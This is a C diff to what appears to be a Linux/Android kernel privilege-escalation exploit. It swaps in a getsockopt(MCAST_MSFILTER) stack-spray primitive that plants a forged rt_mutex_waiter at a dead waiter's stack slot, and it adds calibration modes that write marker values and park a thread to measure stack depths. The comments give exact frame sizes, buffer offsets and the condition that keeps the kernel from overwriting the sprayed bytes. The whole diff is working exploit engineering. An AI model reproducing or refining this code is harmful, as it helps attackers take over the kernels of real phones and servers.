@@ -5,6 +5,12 @@
 #include <time.h>
 #include <unistd.h>
 
+/* bionic exposes MCAST_MSFILTER through <linux/in.h>; keep the value explicit
+ * so the calibration build never depends on the header set. */
+#ifndef MCAST_MSFILTER
+#define MCAST_MSFILTER 48
+#endif
+
 #if defined(__clang__)
 #pragma clang diagnostic ignored "-Wvla-cxx-extension"
 #endif
@@ -73,6 +79,38 @@ static long multicast_waiter_adjust(MulticastWaiterRouteContext *context) {
     return r;
 }
 
+/* Calibration: write one unique non-canonical marker per 8-byte slot instead
+ * of the encoded waiter, so a PI-walk fault reports the buffer offset that
+ * landed on the field the walk dereferenced. */
+static int multicast_marker_mode(void) {
+    static int cached = -1;
+    if (cached < 0)
+        cached = getenv("GHOSTLOCK_MCAST_MARKER") ? 1 : 0;
+    return cached;
+}
+
+/* Stack spray primitive.
+ *
+ * getsockopt(IPPROTO_IP, MCAST_MSFILTER) copies
+ *   size0 = offsetof(struct group_filter, gf_slist_flex) = 0x90 bytes
+ * of user data into a stack local of do_ip_getsockopt() (sp + 0x128 here); the
+ * copy length is fixed by the kernel, optlen only has to be >= 0x90. On a UDP
+ * socket the dispatch chain is
+ *   __arm64_sys_getsockopt 0x3d0 + sock_common_getsockopt 0x40
+ *   + udp_getsockopt 0x10 + ip_getsockopt 0x50 + do_ip_getsockopt 0x2a0 = 0x710
+ * so the buffer lands at stack depth 0x7d8 while the dead rt_mutex_waiter of a
+ * 64-bit waiter thread sits at 0x7c8: the forged waiter starts at buffer + 0x10
+ * (profile mcast_waiter_off = 0x10). gf_group.sa_family at buffer + 8 is
+ * AF_UNSPEC, so ip_mc_gsfget() bails out before writing anything back over the
+ * sprayed bytes. buffer_size must be >= 0x90. */
+static int multicast_waiter_spray(MulticastWaiterRouteContext *context,
+        unsigned char *buffer, size_t size) {
+    socklen_t len = (socklen_t) size;
+    if (size < 0x90) return -1;
+    return getsockopt(context->socket_fd, IPPROTO_IP, MCAST_MSFILTER,
+            buffer, &len);
+}
+
 static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
         uintptr_t target, uintptr_t value,
         uintptr_t lock) {
@@ -82,6 +120,16 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
     __extension__ unsigned char b[size];
     size_t o = context->layout.waiter_offset;
     memset(b, 0, sizeof(b));
+    if (multicast_marker_mode()) {
+        for (size_t i = 0; i + 8 <= size; i += 8) {
+            uint64_t marker = 0x1000000000000000ULL | (uint64_t) i;
+            memcpy(b + i, &marker, sizeof(marker));
+        }
+        uint16_t family = AF_UNSPEC;
+        memcpy(b + 4, &family, sizeof(family));
+        memcpy(b + 8, &family, sizeof(family));
+        return multicast_waiter_spray(context, b, size);
+    }
     /* Same pure encoder as the one-shot route; the resident also stamps the
      * erase words at the waiter head. */
     if (!encode_multicast_waiter(
@@ -96,8 +144,7 @@ static int multicast_waiter_stamp(MulticastWaiterRouteContext *context,
     }
     uint16_t family = AF_UNSPEC;
     memcpy(b + 8, &family, sizeof(family));
-    return setsockopt(context->socket_fd, IPPROTO_IP, MCAST_BLOCK_SOURCE,
-            b, (socklen_t) sizeof(b));
+    return multicast_waiter_spray(context, b, size);
 }
 
 static void *multicast_waiter_worker(void *arg) {
@@ -235,8 +282,17 @@ int MulticastWaiterRoute::start() noexcept {
     /* Let the kernel-side copy of the stamped buffer land before the
      * scheduling change walks the chain (see multicast_post_spray_settle_us). */
     usleep(multicast_post_spray_settle_us());
-    if (!atomic_load(&context->waiter_ready) ||
-            multicast_waiter_adjust(context) < 0)
+    if (!atomic_load(&context->waiter_ready))
+        return 0;
+    if (getenv("GHOSTLOCK_5X_NOWALK")) {
+        /* Calibration: leave the dead waiter and the landed copy in place and
+         * park, so a kprobe/ftrace reader can measure both stack depths without
+         * triggering the PI walk (which panics when the geometry is wrong). */
+        pr_success("5.x NOWALK calibration: waiter tid=%d parked; adjust skipped\n",
+                atomic_load(&context->waiter_tid));
+        for (;;) pause();
+    }
+    if (multicast_waiter_adjust(context) < 0)
         return 0;
     usleep(execution->multicast_post_adjust_settle_us);
     context->ready = 1;
